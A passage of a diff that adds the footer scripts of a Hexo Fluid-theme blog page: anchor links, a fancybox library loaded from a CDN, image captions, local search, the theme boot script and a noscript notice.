+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
